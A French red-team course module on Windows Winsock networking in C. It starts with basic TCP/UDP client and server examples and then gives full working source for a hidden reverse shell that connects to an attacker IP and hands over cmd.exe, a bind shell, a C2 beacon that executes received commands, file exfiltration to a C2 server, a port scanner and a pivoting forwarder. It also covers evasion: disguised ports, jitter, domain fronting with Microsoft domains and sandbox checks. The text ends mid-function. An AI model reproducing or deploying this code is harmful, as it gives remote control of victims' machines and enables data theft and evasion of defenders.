# Networking Winsock - Programmation réseau Windows

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre l'architecture Winsock et son utilisation dans Windows
- [ ] Créer des clients et serveurs TCP/UDP en C
- [ ] Implémenter un reverse shell fonctionnel
- [ ] Gérer les sockets non-bloquantes et asynchrones
- [ ] Appliquer les techniques de réseau pour le C2 en Red Team

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Les concepts de processus et threads Windows
- Les bases du modèle OSI et TCP/IP
- La manipulation de buffers et de chaînes de caractères

## Introduction

**Winsock (Windows Sockets)** est l'implémentation Windows de l'API BSD Sockets pour la programmation réseau. C'est le fondement de toute communication réseau sur Windows, utilisé par les navigateurs, les applications de messagerie, et bien sûr... les backdoors et C2.

### Pourquoi Winsock est crucial en Red Team ?

Imaginez Winsock comme le **système téléphonique de Windows** : il permet à votre programme de "passer des appels" vers d'autres machines, que ce soit pour :
- **Command & Control (C2)** : Établir une connexion persistante avec votre infrastructure d'attaque
- **Exfiltration de données** : Envoyer des fichiers ou informations sensibles
- **Pivoting** : Utiliser la machine compromise comme relais vers d'autres réseaux
- **Reverse Shell** : Obtenir un accès shell interactif à distance

**Winsock vs BSD Sockets** :
- Winsock est compatible avec BSD Sockets (code portable)
- Ajout de fonctionnalités Windows (I/O Completion Ports, overlapped I/O)
- Nécessite l'initialisation explicite avec `WSAStartup()`

## Concepts fondamentaux

### Concept 1 : Architecture Winsock

Winsock s'interface entre votre application et la pile réseau Windows :

```
┌─────────────────────────────────────────────────────────────┐
│                    APPLICATION (C/C++)                       │
│              (Votre reverse shell, backdoor...)              │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                   WINSOCK API (ws2_32.dll)                   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   socket()   │  │   connect()  │  │    send()    │      │
│  │   bind()     │  │   listen()   │  │    recv()    │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              WINDOWS NETWORK STACK (TCPIP.SYS)               │
│              ┌────────────────────────────┐                  │
│              │    TCP/UDP Protocol        │                  │
│              └──────────┬─────────────────┘                  │
│                         │                                     │
│              ┌──────────▼─────────────────┐                  │
│              │     IP Layer (IPv4/IPv6)   │                  │
│              └──────────┬─────────────────┘                  │
└─────────────────────────┼───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│              NETWORK INTERFACE CARD (NIC)                    │
│                (Ethernet, WiFi, etc.)                        │
└─────────────────────────────────────────────────────────────┘
```

**Composants clés** :
- **ws2_32.dll** : Bibliothèque principale Winsock (version 2)
- **Socket** : Endpoint de communication (file descriptor réseau)
- **Protocole** : TCP (fiable, orienté connexion) ou UDP (non fiable, sans connexion)
- **Port** : Numéro identifiant l'application (ex: 80=HTTP, 443=HTTPS, 4444=Metasploit)

### Concept 2 : Types de sockets

**1. Stream Sockets (TCP)** :
```
┌──────────────┐                              ┌──────────────┐
│   CLIENT     │                              │   SERVER     │
│              │                              │              │
│  socket()    │                              │  socket()    │
│  connect() ──┼──────── SYN ───────────────▶│  bind()      │
│              │◀──────── SYN-ACK ───────────┼  listen()    │
│              │──────── ACK ────────────────▶│  accept()    │
│              │                              │              │
│  send()    ──┼──────── DATA ───────────────▶│  recv()      │
│  recv()    ◀─┼──────── DATA ───────────────┼  send()      │
│              │                              │              │
│  close()   ──┼──────── FIN ────────────────▶│  close()     │
└──────────────┘                              └──────────────┘

Caractéristiques TCP:
✓ Connexion établie (handshake 3-way)
✓ Fiable (retransmission en cas de perte)
✓ Ordonné (les packets arrivent dans l'ordre)
✗ Plus lent (overhead du protocole)
```

**2. Datagram Sockets (UDP)** :
```
┌──────────────┐                              ┌──────────────┐
│   CLIENT     │                              │   SERVER     │
│              │                              │              │
│  socket()    │                              │  socket()    │
│              │                              │  bind()      │
│  sendto()  ──┼──────── PACKET ─────────────▶│  recvfrom()  │
│              │                              │              │
│  recvfrom()◀─┼──────── PACKET ─────────────┼  sendto()    │
│              │                              │              │
│  close()     │                              │  close()     │
└──────────────┘                              └──────────────┘

Caractéristiques UDP:
✓ Pas de connexion (stateless)
✓ Rapide (pas d'overhead)
✗ Non fiable (perte possible)
✗ Non ordonné (packets peuvent arriver dans le désordre)
```

### Concept 3 : Cycle de vie d'une socket TCP

**Serveur** :
```c
1. WSAStartup()     // Initialiser Winsock
2. socket()         // Créer la socket
3. bind()           // Lier à une adresse:port
4. listen()         // Écouter les connexions entrantes
5. accept()         // Accepter une connexion (bloquant)
6. recv()/send()    // Communiquer
7. closesocket()    // Fermer la connexion
8. WSACleanup()     // Nettoyer Winsock
```

**Client** :
```c
1. WSAStartup()     // Initialiser Winsock
2. socket()         // Créer la socket
3. connect()        // Se connecter au serveur
4. send()/recv()    // Communiquer
5. closesocket()    // Fermer la connexion
6. WSACleanup()     // Nettoyer Winsock
```

### Concept 4 : Structures de données importantes

```c
// Structure d'adresse IPv4
struct sockaddr_in {
    short          sin_family;   // AF_INET (IPv4)
    unsigned short sin_port;     // Port (network byte order)
    struct in_addr sin_addr;     // Adresse IP
    char           sin_zero[8];  // Padding
};

// Adresse IP
struct in_addr {
    unsigned long s_addr;        // Adresse 32-bit (ex: 192.168.1.1)
};

// Structure générique d'adresse
struct sockaddr {
    unsigned short sa_family;    // Famille d'adresses
    char           sa_data[14];  // Adresse (format dépend de sa_family)
};
```

## Mise en pratique

### Étape 1 : Initialisation de Winsock

Toute utilisation de Winsock commence par l'initialisation :

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    int result;

    // Initialiser Winsock version 2.2
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("[-] WSAStartup failed: %d\n", result);
        return 1;
    }

    printf("[+] Winsock initialized (version %d.%d)\n",
           LOBYTE(wsaData.wVersion),
           HIBYTE(wsaData.wVersion));

    // ... votre code réseau ici ...

    // Nettoyage
    WSACleanup();
    return 0;
}
```

**Explication** :
- `WSAStartup(MAKEWORD(2, 2), &wsaData)` : Demande la version 2.2 de Winsock
- `WSADATA` : Structure contenant des infos sur l'implémentation Winsock
- `WSACleanup()` : Libère les ressources Winsock (OBLIGATOIRE)

**Gestion d'erreurs** :
```c
// Obtenir le code d'erreur Winsock
int error = WSAGetLastError();

// Erreurs courantes:
// WSANOTINITIALISED (10093) : WSAStartup() pas appelé
// WSAECONNREFUSED (10061) : Connexion refusée
// WSAETIMEDOUT (10060) : Timeout de connexion
```

### Étape 2 : Client TCP simple

Création d'un client qui se connecte à un serveur :

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444

int main() {
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    char buffer[1024];
    int result;

    // 1. Initialiser Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 2. Créer une socket TCP
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        printf("[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    printf("[+] Socket created\n");

    // 3. Configurer l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);  // Host to Network byte order
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    // 4. Se connecter au serveur
    result = connect(clientSocket,
                     (struct sockaddr*)&serverAddr,
                     sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[-] Connection failed: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);

    // 5. Envoyer des données
    const char *message = "Hello from client!";
    result = send(clientSocket, message, strlen(message), 0);
    if (result == SOCKET_ERROR) {
        printf("[-] Send failed: %d\n", WSAGetLastError());
    } else {
        printf("[+] Sent: %s (%d bytes)\n", message, result);
    }

    // 6. Recevoir la réponse
    result = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (result > 0) {
        buffer[result] = '\0';
        printf("[+] Received: %s (%d bytes)\n", buffer, result);
    } else if (result == 0) {
        printf("[*] Connection closed by server\n");
    } else {
        printf("[-] Recv failed: %d\n", WSAGetLastError());
    }

    // 7. Nettoyage
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
```

**Points importants** :
- `AF_INET` : Famille d'adresses IPv4 (utilisez `AF_INET6` pour IPv6)
- `SOCK_STREAM` : Socket TCP (utilisez `SOCK_DGRAM` pour UDP)
- `IPPROTO_TCP` : Protocole TCP
- `htons()` : Convertit le port en **network byte order** (big-endian)
- `inet_pton()` : Convertit l'IP string en binaire

### Étape 3 : Serveur TCP simple

Création d'un serveur qui écoute les connexions :

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LISTEN_PORT 4444
#define BACKLOG 5

int main() {
    WSADATA wsaData;
    SOCKET listenSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char buffer[1024];
    int result;

    // 1. Initialiser Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 2. Créer la socket d'écoute
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("[-] Socket creation failed\n");
        WSACleanup();
        return 1;
    }

    // 3. Configurer l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(LISTEN_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;  // Écouter sur toutes les interfaces

    // 4. Lier la socket au port
    result = bind(listenSocket,
                  (struct sockaddr*)&serverAddr,
                  sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        printf("[-] Bind failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] Socket bound to port %d\n", LISTEN_PORT);

    // 5. Passer en mode écoute
    result = listen(listenSocket, BACKLOG);
    if (result == SOCKET_ERROR) {
        printf("[-] Listen failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    printf("[+] Listening for connections...\n");

    // 6. Accepter une connexion (bloquant)
    clientSocket = accept(listenSocket,
                          (struct sockaddr*)&clientAddr,
                          &clientAddrSize);
    if (clientSocket == INVALID_SOCKET) {
        printf("[-] Accept failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    // Afficher l'IP du client
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    printf("[+] Client connected: %s:%d\n", clientIP, ntohs(clientAddr.sin_port));

    // 7. Recevoir des données
    result = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (result > 0) {
        buffer[result] = '\0';
        printf("[+] Received: %s\n", buffer);

        // 8. Envoyer une réponse
        const char *response = "Hello from server!";
        send(clientSocket, response, strlen(response), 0);
    }

    // 9. Nettoyage
    closesocket(clientSocket);
    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
```

**Points importants** :
- `INADDR_ANY` : Écouter sur toutes les interfaces (0.0.0.0)
- `BACKLOG` : Taille de la queue de connexions en attente
- `accept()` : Bloque jusqu'à ce qu'un client se connecte
- `inet_ntop()` : Convertit l'IP binaire en string lisible
- `ntohs()` : Network to Host byte order (inverse de htons)

### Étape 4 : Reverse Shell TCP

L'arme ultime du Red Teamer : le reverse shell. Le client initie la connexion vers le serveur de l'attaquant :

```c
// reverse_shell.c - Windows Reverse Shell
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER "192.168.1.100"  // IP de l'attaquant
#define C2_PORT 4444

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Initialiser Winsock (silencieux, pas de printf en prod)
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Créer la socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configurer l'adresse du C2
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);

    // Se connecter au C2
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Initialiser les structures pour CreateProcess
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Cacher la fenêtre cmd.exe

    // Rediriger stdin, stdout, stderr vers la socket
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // Lancer cmd.exe avec I/O redirigé vers la socket
    if (!CreateProcessA(
            NULL,              // Application name
            "cmd.exe",         // Command line
            NULL,              // Process security
            NULL,              // Thread security
            TRUE,              // Inherit handles (IMPORTANT!)
            0,                 // Creation flags
            NULL,              // Environment
            NULL,              // Current directory
            &si,               // STARTUPINFO
            &pi                // PROCESS_INFORMATION
        )) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Attendre que le processus se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Nettoyage
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
```

**Comment ça fonctionne** :

```
┌────────────────────┐                    ┌────────────────────┐
│  Attacker Machine  │                    │  Victim Machine    │
│  192.168.1.100     │                    │  192.168.1.50      │
│                    │                    │                    │
│  nc -lvp 4444      │◀───── Connect ─────│  reverse_shell.exe │
│                    │                    │                    │
│  > whoami          │─────── stdin ─────▶│  cmd.exe           │
│                    │                    │    ↓               │
│                    │◀───── stdout ──────│  Execute command   │
│  victim\user       │                    │    ↓               │
│                    │                    │  Return output     │
└────────────────────┘                    └────────────────────┘
```

**Côté attaquant** (Linux/Mac) :
```bash
# Écouter avec netcat
nc -lvp 4444

# Quand la victime se connecte:
Microsoft Windows [Version 10.0.19041.1110]
(c) Microsoft Corporation. All rights reserved.

C:\Users\victim> whoami
victim\user

C:\Users\victim> dir
...
```

### Étape 5 : Bind Shell TCP

Alternative au reverse shell : la victime écoute, l'attaquant se connecte :

```c
// bind_shell.c - Windows Bind Shell
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define BIND_PORT 4444

int main() {
    WSADATA wsaData;
    SOCKET listenSock, clientSock;
    struct sockaddr_in serverAddr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(BIND_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(listenSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSock, 1);

    // Attendre la connexion de l'attaquant
    clientSock = accept(listenSock, NULL, NULL);

    // Rediriger I/O vers la socket cliente
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)clientSock;
    si.hStdOutput = (HANDLE)clientSock;
    si.hStdError = (HANDLE)clientSock;

    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSock);
    closesocket(listenSock);
    WSACleanup();

    return 0;
}
```

**Reverse Shell vs Bind Shell** :

| Critère | Reverse Shell | Bind Shell |
|---------|---------------|------------|
| **Direction** | Victime → Attaquant | Attaquant → Victime |
| **Firewall** | Contourne facilement (trafic sortant) | Bloqué si firewall entrant actif |
| **NAT** | Fonctionne derrière NAT | Nécessite port forwarding |
| **OPSEC** | Meilleur (trafic sortant normal) | Suspect (port en écoute inhabituel) |
| **Détection** | Plus difficile à détecter | Facilement détecté (netstat) |

### Étape 6 : Communication UDP

UDP est utile pour des besoins spécifiques (DNS tunneling, exfiltration rapide) :

```c
// Client UDP
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET udpSocket;
    struct sockaddr_in serverAddr;
    char buffer[1024];
    int result;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Créer socket UDP
    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5555);
    inet_pton(AF_INET, "192.168.1.100", &serverAddr.sin_addr);

    // Envoyer un datagram (pas de connexion)
    const char *message = "UDP message";
    result = sendto(udpSocket,
                    message,
                    strlen(message),
                    0,
                    (struct sockaddr*)&serverAddr,
                    sizeof(serverAddr));

    printf("[+] Sent %d bytes via UDP\n", result);

    // Recevoir une réponse
    int addrLen = sizeof(serverAddr);
    result = recvfrom(udpSocket,
                      buffer,
                      sizeof(buffer) - 1,
                      0,
                      (struct sockaddr*)&serverAddr,
                      &addrLen);

    if (result > 0) {
        buffer[result] = '\0';
        printf("[+] Received: %s\n", buffer);
    }

    closesocket(udpSocket);
    WSACleanup();

    return 0;
}
```

**Serveur UDP** :
```c
// Serveur UDP
int main() {
    WSADATA wsaData;
    SOCKET udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char buffer[1024];
    int clientAddrLen = sizeof(clientAddr);

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5555);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    printf("[+] UDP server listening on port 5555\n");

    // Recevoir des datagrams
    int result = recvfrom(udpSocket,
                          buffer,
                          sizeof(buffer) - 1,
                          0,
                          (struct sockaddr*)&clientAddr,
                          &clientAddrLen);

    if (result > 0) {
        buffer[result] = '\0';
        printf("[+] Received: %s\n", buffer);

        // Répondre au client
        sendto(udpSocket, "ACK", 3, 0,
               (struct sockaddr*)&clientAddr, clientAddrLen);
    }

    closesocket(udpSocket);
    WSACleanup();

    return 0;
}
```

### Étape 7 : Sockets non-bloquantes

Par défaut, `recv()` et `accept()` bloquent. Pour des opérations asynchrones :

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    u_long mode = 1;  // 1 = non-blocking, 0 = blocking
    char buffer[1024];

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

    // Rendre la socket non-bloquante
    ioctlsocket(sock, FIONBIO, &mode);

    // Connect en non-blocking
    int result = connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    if (result == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == WSAEWOULDBLOCK) {
            printf("[*] Connection in progress...\n");

            // Utiliser select() pour attendre que la connexion soit établie
            fd_set writefds;
            struct timeval timeout;

            FD_ZERO(&writefds);
            FD_SET(sock, &writefds);

            timeout.tv_sec = 5;
            timeout.tv_usec = 0;

            result = select(0, NULL, &writefds, NULL, &timeout);
            if (result > 0) {
                printf("[+] Connected!\n");
            } else {
                printf("[-] Connection timeout\n");
                closesocket(sock);
                WSACleanup();
                return 1;
            }
        }
    }

    // Recv en non-blocking
    while (1) {
        result = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (result > 0) {
            buffer[result] = '\0';
            printf("[+] Received: %s\n", buffer);
            break;
        } else if (result == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                printf("[*] No data available yet...\n");
                Sleep(100);  // Attendre un peu
                continue;
            } else {
                printf("[-] Recv error: %d\n", error);
                break;
            }
        } else {
            printf("[*] Connection closed\n");
            break;
        }
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}
```

**select() pour multiplexer plusieurs sockets** :
```c
// Surveiller plusieurs sockets simultanément
void MultiplexSockets(SOCKET sock1, SOCKET sock2) {
    fd_set readfds;
    struct timeval timeout;
    char buffer[1024];

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(sock1, &readfds);
        FD_SET(sock2, &readfds);

        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        int result = select(0, &readfds, NULL, NULL, &timeout);

        if (result > 0) {
            if (FD_ISSET(sock1, &readfds)) {
                recv(sock1, buffer, sizeof(buffer), 0);
                printf("[+] Data from socket 1\n");
            }

            if (FD_ISSET(sock2, &readfds)) {
                recv(sock2, buffer, sizeof(buffer), 0);
                printf("[+] Data from socket 2\n");
            }
        }
    }
}
```

## Application offensive

### Contexte Red Team

Winsock est au coeur de toute opération Red Team moderne :

**1. Command & Control (C2)**

Les frameworks C2 modernes utilisent Winsock pour maintenir la connexion :

```c
// C2 Beacon - Connexion périodique vers le serveur C2
void C2Beacon(const char *c2_server, int c2_port, int sleep_time) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char buffer[4096];
    int result;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    while (1) {
        // Créer une nouvelle socket
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(c2_port);
        inet_pton(AF_INET, c2_server, &serverAddr.sin_addr);

        // Tenter de se connecter
        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            // Envoyer un beacon (heartbeat)
            const char *beacon = "BEACON|hostname|username|ip";
            send(sock, beacon, strlen(beacon), 0);

            // Recevoir des commandes
            result = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (result > 0) {
                buffer[result] = '\0';

                // Exécuter la commande
                ExecuteCommand(buffer);
            }

            closesocket(sock);
        }

        // Sleep avant le prochain beacon (jitter pour éviter détection)
        int jitter = (rand() % 10) - 5;  // ±5 secondes
        Sleep((sleep_time + jitter) * 1000);
    }

    WSACleanup();
}
```

**2. Exfiltration de données**

```c
// Exfiltrer un fichier via socket
void ExfiltrateFile(const char *filepath, const char *c2_server, int c2_port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    FILE *file;
    char buffer[4096];
    size_t bytesRead;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(c2_port);
    inet_pton(AF_INET, c2_server, &serverAddr.sin_addr);

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
        // Ouvrir le fichier
        file = fopen(filepath, "rb");
        if (file) {
            // Envoyer le nom du fichier
            char header[256];
            snprintf(header, sizeof(header), "FILE|%s|", filepath);
            send(sock, header, strlen(header), 0);

            // Envoyer le contenu
            while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                send(sock, buffer, bytesRead, 0);
            }

            fclose(file);
            printf("[+] File exfiltrated: %s\n", filepath);
        }

        closesocket(sock);
    }

    WSACleanup();
}
```

**3. Port Scanning**

```c
// Scanner de ports TCP
void ScanPorts(const char *target_ip, int start_port, int end_port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in targetAddr;
    u_long mode = 1;
    struct timeval timeout;
    fd_set writefds;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    printf("[*] Scanning %s ports %d-%d\n", target_ip, start_port, end_port);

    for (int port = start_port; port <= end_port; port++) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        targetAddr.sin_family = AF_INET;
        targetAddr.sin_port = htons(port);
        inet_pton(AF_INET, target_ip, &targetAddr.sin_addr);

        // Non-blocking pour timeout rapide
        ioctlsocket(sock, FIONBIO, &mode);

        connect(sock, (struct sockaddr*)&targetAddr, sizeof(targetAddr));

        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        if (select(0, NULL, &writefds, NULL, &timeout) > 0) {
            printf("[+] Port %d open\n", port);
        }

        closesocket(sock);
    }

    WSACleanup();
}
```

**4. Pivoting et Port Forwarding**

```c
// Simple port forwarder (proxy TCP)
// Redirige le trafic de local_port vers remote_ip:remote_port
void PortForward(int local_port, const char *remote_ip, int remote_port) {
    WSADATA wsaData;
    SOCKET listenSock, clientSock, remoteSock;
    struct sockaddr_in localAddr, remoteAddr;
    char buffer[4096];
    fd_set readfds;
    int result;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    localAddr.sin_family = AF_INET;
    localAddr.sin_port = htons(local_port);
    localAddr.sin_addr.s_addr = INADDR_ANY;

    bind(listenSock, (struct sockaddr*)&localAddr, sizeof(localAddr));
    listen(listenSock, 5);

    printf("[+] Forwarding localhost:%d -> %s:%d\n", local_port, remote_ip, remote_port);

    while (1) {
        // Accepter connexion locale
        clientSock = accept(listenSock, NULL, NULL);

        // Se connecter au serveur distant
        remoteSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        remoteAddr.sin_family = AF_INET;
        remoteAddr.sin_port = htons(remote_port);
        inet_pton(AF_INET, remote_ip, &remoteAddr.sin_addr);

        if (connect(remoteSock, (struct sockaddr*)&remoteAddr, sizeof(remoteAddr)) == 0) {
            // Relayer les données bidirectionnellement
            while (1) {
                FD_ZERO(&readfds);
                FD_SET(clientSock, &readfds);
                FD_SET(remoteSock, &readfds);

                result = select(0, &readfds, NULL, NULL, NULL);

                if (FD_ISSET(clientSock, &readfds)) {
                    result = recv(clientSock, buffer, sizeof(buffer), 0);
                    if (result <= 0) break;
                    send(remoteSock, buffer, result, 0);
                }

                if (FD_ISSET(remoteSock, &readfds)) {
                    result = recv(remoteSock, buffer, sizeof(buffer), 0);
                    if (result <= 0) break;
                    send(clientSock, buffer, result, 0);
                }
            }
        }

        closesocket(clientSock);
        closesocket(remoteSock);
    }

    closesocket(listenSock);
    WSACleanup();
}
```

### Considérations OPSEC

**1. Détection réseau**

Les connexions réseau sont surveillées par :
- **Firewall Windows** : Peut bloquer ou alerter sur les connexions
- **EDR/XDR** : Surveille les connexions sortantes suspectes
- **IDS/IPS** : Analyse le trafic réseau pour détecter des patterns malveillants
- **Network monitoring** : Outils comme Wireshark, tcpdump

**2. Techniques d'évasion**

```c
// A. Utiliser des ports légitimes
// MAUVAIS: Port 4444, 1337, 31337 (ports Metasploit connus)
// BON: Port 443 (HTTPS), 53 (DNS), 80 (HTTP)

#define C2_PORT 443  // Se fait passer pour HTTPS

// B. Chiffrer les communications
void EncryptedCommunication(SOCKET sock) {
    char plaintext[] = "secret command";
    char ciphertext[256];

    // XOR simple (en prod, utilisez AES ou ChaCha20)
    for (int i = 0; i < strlen(plaintext); i++) {
        ciphertext[i] = plaintext[i] ^ 0xAA;
    }

    send(sock, ciphertext, strlen(plaintext), 0);
}

// C. Ajouter du jitter (variation aléatoire)
void BeaconWithJitter(int base_sleep) {
    srand(time(NULL));
    int jitter = (rand() % (base_sleep / 2)) - (base_sleep / 4);
    Sleep((base_sleep + jitter) * 1000);
}

// D. Domain fronting / DNS tunneling
// Utiliser des domaines légitimes comme front
const char *domains[] = {
    "update.microsoft.com",
    "azure.microsoft.com",
    "windowsupdate.com"
};

// E. Vérifier si on est dans une sandbox
BOOL IsInSandbox() {
    // Vérifier le nombre de CPUs (VMs souvent < 4)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // Vérifier la RAM (sandboxes souvent < 4GB)
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return TRUE;

    return FALSE;
}
```

**3. Artefacts laissés**

```c
// Logs Windows Event Viewer
// - Event ID 5156 : Connexion réseau autorisée (Windows Filtering Platform)
// - Event ID 3 : Connexion réseau (Sysmon)

// Netstat montre les connexions actives
// > netstat -ano | findstr ESTABLISHED

// Pour éviter la détection:
// - Utiliser des connexions courtes (beacon vs persistent shell)
// - Fermer les sockets immédiatement après usage
// - Ne pas laisser de ports en écoute (préférer reverse shell)
```

**4. Proxy et redirection**

```c
// Utiliser les proxies système (pour contourner les règles firewall)
void UseSystemProxy() {
    // Windows utilise les paramètres IE pour les proxies
